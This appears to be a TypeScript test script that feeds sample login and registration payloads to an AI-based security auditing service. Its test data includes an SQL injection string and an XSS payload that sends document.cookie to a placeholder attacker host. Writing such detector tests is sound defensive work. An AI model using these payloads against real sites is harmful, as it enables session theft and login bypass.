import { AiSecurityService, type Logger } from './application/ai/ai-security.service.js';

// Initialize Mock Logger to print output to the terminal
const mockLogger: Logger = {
  debug: (msg: string) => console.log(`[DEBUG] ${msg}`),
  warn: (obj: Record<string, unknown>, msg: string) => console.warn(`[WARN] ${msg}`, obj),
  error: (obj: Record<string, unknown>, msg: string) => console.error(`[ERROR] ${msg}`, obj),
};

async function runTest() {
  console.log('=== STARTING AI SECURITY SERVICE TEST ===\n');
  const service = new AiSecurityService(mockLogger);

  // 1. Test Safe Payload (SAFE)
  console.log('--- 1. Sending VALID login request (SAFE) ---');
  const safePayload = {
    email: 'user@morningmist.com',
    password: 'SecurePassword123!',
  };
  await service.auditPayloadAsync('/login', '127.0.0.1', safePayload);
  console.log('✅ Finished SAFE payload check. (Should not see [ERROR] logs)\n');

  // 2. Test SQL Injection Attack (DANGEROUS)
  console.log('--- 2. Sending SQL Injection attack payload (DANGEROUS) ---');
  const sqlInjectionPayload = {
    email: "admin@morningmist.com' OR '1'='1",
    password: 'anything',
  };
  await service.auditPayloadAsync('/login', '192.168.1.100', sqlInjectionPayload);
  console.log('✅ Finished SQL Injection check.\n');

  // 3. Test XSS Attack (DANGEROUS)
  console.log('--- 3. Sending XSS attack payload (DANGEROUS) ---');
  const xssPayload = {
    email: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
    password: 'password',
  };
  await service.auditPayloadAsync('/register', '10.0.0.5', xssPayload);
  console.log('✅ Finished XSS check.\n');

  console.log('=== TEST SUITE COMPLETED ===');
}

runTest().catch((err) => {
  console.error('Error running test script:', err);
});
